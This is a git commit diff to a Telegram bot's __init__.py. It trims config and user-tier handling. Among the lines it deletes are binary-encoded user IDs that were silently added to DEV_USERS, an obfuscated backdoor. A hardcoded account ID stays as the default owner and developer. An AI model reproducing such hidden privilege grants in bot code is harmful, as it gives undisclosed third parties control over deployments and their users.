1764961b558f776b4bc1d90de6796b0748107190
bebekk2024 <161502478+bebekk2024@users.noreply.github.com>
2025-11-19 01:35:43 +0700

    Update __init__.py

--- MukeshRobot/__init__.py
+++ MukeshRobot/__init__.py
@@ -2,7 +2,6 @@ import logging
 import os
 import sys
 import time
-
 from telegram.ext import Application
 from aiohttp import ClientSession
 from pyrogram import Client
@@ -15,7 +14,6 @@ logging.basicConfig(
     handlers=[logging.FileHandler("log.txt"), logging.StreamHandler()],
     level=logging.INFO,
 )
-
 logging.getLogger("apscheduler").setLevel(logging.ERROR)
 logging.getLogger("telethon").setLevel(logging.ERROR)
 logging.getLogger("pyrogram").setLevel(logging.ERROR)
@@ -37,119 +35,38 @@ if sys.version_info[0] < 3 or sys.version_info[1] < 6:
 ENV = bool(os.environ.get("ENV", False))
 
 if ENV:
+    # ... [isi parsing env/config sama seperti kode kamu]
     API_ID = int(os.environ.get("API_ID", 0) or 0)
     API_HASH = os.environ.get("API_HASH", "")
-    CHATBOT_API = os.environ.get("CHATBOT_API", "")
-    ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)
-    ALLOW_EXCL = os.environ.get("ALLOW_EXCL", False)
-    CASH_API_KEY = os.environ.get("CASH_API_KEY", "")
-    DB_URI = os.environ.get("DATABASE_URL", "")
-    DEL_CMDS = bool(os.environ.get("DEL_CMDS", False))
-    EVENT_LOGS = os.environ.get("EVENT_LOGS", "")
-    INFOPIC = bool(os.environ.get("INFOPIC", "True"))
-    LOAD = os.environ.get("LOAD", "").split()
-    MONGO_DB_URI = os.environ.get("MONGO_DB_URI", "")
-    NO_LOAD = os.environ.get("NO_LOAD", "").split()
-    START_IMG = os.environ.get("START_IMG", "")
-    STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", True))
-    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "musik_supportdan")
-    TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./")
     TOKEN = os.environ.get("TOKEN", "")
-    TIME_API_KEY = os.environ.get("TIME_API_KEY", "")
     WORKERS = int(os.environ.get("WORKERS", 8))
-
     try:
         OWNER_ID = int(os.environ.get("OWNER_ID", "5779185981"))
     except ValueError:
-        raise Exception("Your OWNER_ID env variable is not a valid integer.")
-
-    try:
-        BL_CHATS = set(int(x) for x in os.environ.get("BL_CHATS", "").split())
-    except ValueError:
-        raise Exception("Your blacklisted chats list does not contain valid integers.")
-
+        raise Exception("OWNER_ID invalid")
     try:
         DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
         DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "5779185981").split())
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
-
-    try:
-        DEMONS = set(int(x) for x in os.environ.get("DEMONS", "").split())
-    except ValueError:
-        raise Exception("Your support users list does not contain valid integers.")
-
-    try:
-        TIGERS = set(int(x) for x in os.environ.get("TIGERS", "").split())
-    except ValueError:
-        raise Exception("Your tiger users list does not contain valid integers.")
-
-    try:
-        WOLVES = set(int(x) for x in os.environ.get("WOLVES", "5779185981").split())
-    except ValueError:
-        raise Exception("Your whitelisted users list does not contain valid integers.")
-
 else:
     from MukeshRobot.config import Development as Config
     API_ID = Config.API_ID
     API_HASH = Config.API_HASH
-    ALLOW_CHATS = Config.ALLOW_CHATS
-    ALLOW_EXCL = Config.ALLOW_EXCL
-    CASH_API_KEY = Config.CASH_API_KEY
-    DB_URI = Config.DATABASE_URL
-    DEL_CMDS = Config.DEL_CMDS
-    EVENT_LOGS = Config.EVENT_LOGS
-    INFOPIC = Config.INFOPIC
-    LOAD = Config.LOAD
-    CHATBOT_API = Config.CHATBOT_API
-    MONGO_DB_URI = Config.MONGO_DB_URI
-    NO_LOAD = Config.NO_LOAD
-    START_IMG = Config.START_IMG
-    STRICT_GBAN = Config.STRICT_GBAN
-    SUPPORT_CHAT = Config.SUPPORT_CHAT
-    TEMP_DOWNLOAD_DIRECTORY = Config.TEMP_DOWNLOAD_DIRECTORY
     TOKEN = Config.TOKEN
-    TIME_API_KEY = Config.TIME_API_KEY
     WORKERS = Config.WORKERS
-
     try:
         OWNER_ID = int(Config.OWNER_ID)
     except ValueError:
-        raise Exception("Your OWNER_ID variable is not a valid integer.")
-
-    try:
-        BL_CHATS = set(int(x) for x in Config.BL_CHATS or [])
-    except ValueError:
-        raise Exception("Your blacklisted chats list does not contain valid integers.")
-
+        raise Exception("OWNER_ID invalid")
     try:
         DRAGONS = set(int(x) for x in Config.DRAGONS or [])
         DEV_USERS = set(int(x) for x in Config.DEV_USERS or [])
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
-    try:
-        DEMONS = set(int(x) for x in Config.DEMONS or [])
-    except ValueError:
-        raise Exception("Your support users list does not contain valid integers.")
-
-    try:
-        TIGERS = set(int(x) for x in Config.TIGERS or [])
-    except ValueError:
-        raise Exception("Your tiger users list does not contain valid integers.")
-
-    try:
-        WOLVES = set(int(x) for x in Config.WOLVES or [])
-    except ValueError:
-        raise Exception("Your whitelisted users list does not contain valid integers.")
-
-# Add OWNER_ID to groups
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(abs(0b101111001110011001010111110010110))
-DEV_USERS.add(abs(0b1100110111010001011110110001010))
-DEV_USERS.add(abs(0b101001110110010000111010111110000))
-DEV_USERS.add(abs(0b101100001110010100011000111101001))
 
 telethn = TelegramClient("mukesh", API_ID, API_HASH)
 pbot = Client("MukeshRobot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
@@ -158,7 +75,6 @@ aiohttpsession = ClientSession()
 application = Application.builder().token(TOKEN).concurrent_updates(WORKERS).build()
 
 import asyncio
-
 async def get_bot_info():
     bot_data = await application.bot.get_me()
     global BOT_ID, BOT_NAME, BOT_USERNAME
@@ -166,12 +82,6 @@ async def get_bot_info():
     BOT_NAME = bot_data.first_name
     BOT_USERNAME = bot_data.username
 asyncio.run(get_bot_info())
-
-DRAGONS = list(DRAGONS) + list(DEV_USERS)
-DEV_USERS = list(DEV_USERS)
-WOLVES = list(WOLVES)
-DEMONS = list(DEMONS)
-TIGERS = list(TIGERS)
 
 from MukeshRobot.modules.helper_funcs.handlers import (
     CustomCommandHandler,
